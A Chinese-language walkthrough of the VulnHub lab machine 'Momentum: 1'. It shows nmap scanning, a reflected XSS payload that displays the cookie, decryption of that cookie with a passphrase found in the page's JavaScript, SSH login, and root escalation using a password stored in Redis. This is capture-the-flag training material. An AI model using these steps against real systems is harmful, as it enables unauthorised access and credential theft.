靶机地址：[Momentum: 1 ~ VulnHub](https://vulnhub.com/entry/momentum-1,685/)
主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- 192.168.1.46
sudo nmap -p22,80 -sV 192.168.1.46
# 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
# 80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```
访问web服务看看，除了首页还有图片详情，链接为
```
http://192.168.1.46/opus-details.php?id=visor
```
尝试对 `id` 参数进行SQL注入尝试，失败了
```Shell
sqlmap -u "http://192.168.1.46/opus-details.php?id=visor" -p "id"
```
再试试XSS
```
http://192.168.1.46/opus-details.php?id=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```
成功了，弹出一段cookie
```
cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt
```
查看网页源码，其中 `main.js` 中包含如下一段注释
```JavaScript
var CryptoJS = require("crypto-js");
var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
console.log(decrypted.toString(CryptoJS.enc.Utf8));
```
使用如下代码尝试对cookie进行解密
```html
<html>
<head>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
</head>
<body>
<div id="result"></div>
<script>
	var data = "U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt";
	var bytes = CryptoJS.AES.decrypt(data, 'SecretPassphraseMomentum');
	var decryptedData = bytes.toString(CryptoJS.enc.Utf8);
	document.getElementById("result").innerHTML = decryptedData;
</script>
</body>
</html>
```
得到如下结果
```
auxerre-alienum##
```
尝试SSH，最终使用账号 `auxerre` 和密码 `auxerre-alienum##` 成功登录系统
尝试提权，一番尝试都不行，回到信息收集，查看服务运行状态
```Shell
ss -antlp
# LISTEN               0                    128                                      127.0.0.1:6379                                    0.0.0.0:*
```
发现6379端口是打开的
```Shell
redis-cli
> INFO Keyspace
> KEYS *
# 1) "rootpass"
> GET "rootpass"
# "m0mentum-al1enum##"
```
尝试su
```Shell
su
# m0mentum-al1enum##
```
提权成功